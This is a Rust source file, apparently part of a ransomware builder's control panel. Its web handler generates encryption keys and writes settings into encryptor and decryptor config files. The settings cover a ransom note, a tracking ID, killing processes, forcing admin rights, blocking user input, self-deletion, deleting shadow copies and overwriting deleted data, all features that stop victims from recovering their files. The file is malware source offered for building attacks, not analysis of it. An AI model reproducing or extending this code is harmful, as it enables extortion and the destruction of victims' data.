use std::fs::File;
use std::io::Write;

use axum::Json;
use axum::http::StatusCode;
use axum::response::IntoResponse;

use serde_json::Value;

use crate::random::shuffle_string;
use crate::key::{generate_key_pairs, export_key_pairs};
use crate::hash::hash_blake3;
use crate::crypt::encrypt_data;

use crate::state::PROJECT_ROOT_DIR_PATH;

use crate::private::database::create_db;

use crate::utils::parse::*;
use crate::utils::editor::Editor;
use crate::utils::misc::encode_key;

const CHAR_SET: &str = "QWERTYUIOPASDFGHJKLZXCVBNM123456789";

pub async fn update_config(Json(body): Json<Value>) -> impl IntoResponse {
    let shuffled = shuffle_string(CHAR_SET);
    let hex_char_set = &shuffled[..16];

    let (private_keys, public_keys) = generate_key_pairs()
        .unwrap();

    let (private_key, public_key) = export_key_pairs(&private_keys, &public_keys);

    let tracking_id = get_str(&body["tracking_id"]);

    let build_data_path = create_db(&tracking_id);
    let mut build_data_file = File::create(build_data_path)
        .unwrap();

    let encoded_private_key = encode_key(&private_key, hex_char_set.as_bytes());
    let encoded_public_key = encode_key(&public_key, hex_char_set.as_bytes());

    build_data_file.write_all("[CHAR_SET]\n".as_bytes()).ok();
    build_data_file.write_all(format!("{}\n\n", hex_char_set).as_bytes()).ok();
    build_data_file.write_all("[PRIV_KEY]\n".as_bytes()).ok();
    build_data_file.write_all(format!("{}\n\n", encoded_private_key).as_bytes()).ok();
    build_data_file.write_all("[PRIV_KEY]\n".as_bytes()).ok();
    build_data_file.write_all(format!("{}", encoded_public_key).as_bytes()).ok();

    let encryption_key = hash_blake3(&public_key);

    let encrypted_tracking_id = encrypt_data(
        tracking_id.as_bytes(),
        &encryption_key
    );

    let encrypted_note = encrypt_data(
        get_str(&body["note"]).as_bytes(),
        &encryption_key
    );

    let encryptor_config_path = PROJECT_ROOT_DIR_PATH
        .get()
        .unwrap()
        .join("encryptor\\src\\config.rs");

    Editor::new(&encryptor_config_path)
        .byte_array("HEX_CHAR_SET", hex_char_set.as_bytes())
        .byte_array("PUBLICK_KEY", &public_key)

        .byte_array("ENCRYPTED_TRACKING_ID", &encrypted_tracking_id.unwrap())
        .byte_array("ENCRYPTED_NOTE", &encrypted_note.unwrap())

        .number("FILE_ENUMERATION_CHUNK_SIZE", get_usize(&body["files_enumeration_chunk_size"]))
        .number("OVERWRITE_DELETED_DATA_PASSES", get_usize(&body["overwrite_deleted_data_passes"]))

        .str_array("PROCESSES_TO_KILL", &get_str_array(&body["processes_to_kill"]))
        .str_array("WHITELISTED_DIRECTORIES", &get_str_array(&body["whitelisted_directories"]))
        .str_array("WHITELISTED_FILE_NAMES", &get_str_array(&body["whitelisted_file_names"]))
        .str_array("WHITELISTED_FILE_EXTENSIONS", &get_str_array(&body["whitelisted_file_extensions"]))

        .bool("BLOCK_INPUT", get_bool(&body["block_input"]))
        .bool("FORCE_ADMIN", get_bool(&body["force_admin"]))
        .bool("SELF_DELETE", get_bool(&body["melt_file"]))
        .bool("OPEN_NOTE", get_bool(&body["open_note"]))
        .bool("RESTART", get_bool(&body["restart_device"]))
        .bool("DELETE_SHADOW_COPIES", get_bool(&body["delete_shadow_copies"]))
        .bool("OVERWRITE_DELETED_DATA", get_bool(&body["overwrite_deleted_data"]))
        .bool("ENCRYPT_SEPARATELY", get_bool(&body["encrypt_separately"]))
        .bool("ADD_FILE_EXTENSION", get_bool(&body["add_file_extension"]))

        .finalize()
        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)
        .unwrap();

    let decryptor_config_path = PROJECT_ROOT_DIR_PATH
        .get()
        .unwrap()
        .join("decryptor\\src\\config.rs");

    Editor::new(&decryptor_config_path)
        .bool("DEDICATED", true)

        .byte_array("HEX_CHAR_SET", hex_char_set.as_bytes())
        .byte_array("PRIVATE_KEY", &private_key)

        .str_array("WHITELISTED_DIRECTORIES", &get_str_array(&body["whitelisted_directories"]))
        .str_array("WHITELISTED_FILE_NAMES", &get_str_array(&body["whitelisted_file_names"]))
        .str_array("WHITELISTED_FILE_EXTENSIONS", &get_str_array(&body["whitelisted_file_extensions"]))

        .bool("ADD_FILE_EXTENSION", get_bool(&body["add_file_extension"]))

        .finalize()
        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)
        .unwrap();

    StatusCode::OK
}
